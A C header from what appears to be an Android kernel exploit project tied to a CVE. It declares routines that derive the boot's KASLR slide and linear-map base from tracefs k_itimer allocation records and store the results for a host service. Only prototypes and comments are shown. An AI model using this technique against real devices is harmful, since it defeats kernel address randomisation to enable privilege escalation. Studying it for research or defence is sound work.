#ifndef CALIB_H
#define CALIB_H

#include <stddef.h>
#include <stdint.h>

/*
 * calib.h - calib_a / calib_b
 *
 * Corresponds to the PC reference implementation:
 *   calib_a = scripts/capture_site.sh + tools/slide_from_timers.py
 *           -> derives this boot's KASLR slide
 *   calib_b = scripts/calib.sh         + tools/solve_lmap.py
 *           -> derives this boot's linear map base page_offset
 *
 * Results are persisted (read by the host Shizuku UserService):
 *   $CVE98260_HOME/slide.txt          content like 0x1f200000
 *   $CVE98260_HOME/page_offset.txt    content like 0xffffff7f80000000
 *   $CVE98260_HOME/page_offset.score  content like "132/150" or "fallback"
 *
 * calib_core.c holds the platform-independent pure-compute part (host unit-testable),
 * calib.c holds the tracefs capture and flow orchestration.
 */

int calib_a_main(int argc, char **argv);
int calib_b_main(int argc, char **argv);

/* a value and its occurrence count (output of calib_top_values) */
struct calib_run {
	uint64_t value;
	int count;
};

/*
 * linear map base solving (core of solve_lmap.py).
 * Returns the base with the most hits; *best_score is the hit count (0 means no solution).
 * pfns must already be sorted ascending.
 */
uint64_t calib_solve_lmap(const uint64_t *pages, size_t n_pages,
			  const uint64_t *pfns, size_t n_pfns,
			  uint64_t *best_score);

/*
 * raw trace record scanning (core of slide_from_timers.py).
 * Returns a malloc'd array (call sites when want_site=1, else object virtual addresses),
 * count written to *out_n. When filter_site=1 only records with site == site_link are kept.
 *
 * sizes / n_sizes is the candidate set of sizeof(struct k_itimer) values to accept.
 * A record matches when req == alloc == sizes[si] for some si (the original req==alloc
 * invariant is preserved, only widened to the candidate set). Pass NULL/0 to use the
 * built-in default set {0x108,0x100,0x110,0x118} so host unit tests stay runnable.
 */
uint64_t *calib_scan_kitimer(const uint8_t *data, size_t len,
			     uint64_t site_link, int want_site,
			     int filter_site,
			     const uint64_t *sizes, size_t n_sizes,
			     size_t *out_n);

/* count the most frequent values (descending), return the number written */
size_t calib_top_values(uint64_t *arr, size_t n, struct calib_run *out,
			size_t out_cap);

/*
 * convert object virtual addresses into deduplicated slab pages (order-1 = 8KB, 8K aligned).
 * pages must be caller-allocated with at least n_ptrs uint64_t. Returns the page count.
 */
size_t calib_pages_from_ptrs(uint64_t *ptrs, size_t n_ptrs, uint64_t *pages);

#endif /* CALIB_H */
